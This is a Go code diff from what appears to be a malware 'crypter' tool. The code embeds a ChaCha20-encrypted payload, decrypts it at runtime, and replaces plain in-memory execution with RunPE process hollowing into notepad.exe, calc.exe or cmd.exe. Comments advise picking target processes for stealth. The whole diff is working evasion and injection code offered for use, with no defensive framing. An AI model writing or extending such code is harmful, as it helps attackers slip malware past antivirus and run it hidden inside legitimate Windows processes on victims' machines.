@@ -4,9 +4,10 @@ import (
 	_ "embed"
 	"log"
 	"os"
+	"path/filepath"
 
-	"github.com/amenzhinsky/go-memexec"
 	"golang.org/x/crypto/chacha20"
+	"crypter/internal/runpe"
 )
 
 //go:embed encrypted_Input.bin
@@ -39,19 +40,26 @@ func decryptFile() ([]byte, error) {
 }
 
 func fileless(execBytes []byte) {
-	exe, err := memexec.New(execBytes)
-	if err != nil {
-		log.Fatalf("Failed to create memory executable: %v", err)
-	}
-	defer exe.Close()
-
-	cmd := exe.Command()
-	cmd.Stdout = os.Stdout
-	cmd.Stderr = os.Stderr
-
-	if err := cmd.Run(); err != nil {
-		log.Fatalf("Failed to execute in-memory: %v", err)
+	// Try multiple potential target processes in case one fails, these can be configured to your liking
+	// Preferably, local user space accessible processes (avoid System32 processes if you really want to be stealthy, like OneDrive or Chrome)
+	// Note: This is a simplified example. In a real-world scenario, you would want to check if the target process is running and if it has the necessary permissions.
+	
+	targetPaths := []string{
+		filepath.Join(os.Getenv("WINDIR"), "System32", "notepad.exe"),
+		filepath.Join(os.Getenv("WINDIR"), "System32", "calc.exe"),
+		filepath.Join(os.Getenv("WINDIR"), "System32", "cmd.exe"),
 	}
 	
-	log.Println("Memory execution completed successfully")
+	var lastErr error
+	for _, targetPath := range targetPaths {
+		err := runpe.ExecuteInMemory(execBytes, targetPath)
+		if err == nil {
+			log.Println("RunPE memory execution completed successfully using", targetPath)
+			return
+		}
+		lastErr = err
+		log.Printf("Failed to execute using %s: %v, trying next target...", targetPath, err)
+	}
+	
+	log.Fatalf("All RunPE execution attempts failed. Last error: %v", lastErr)
 } 
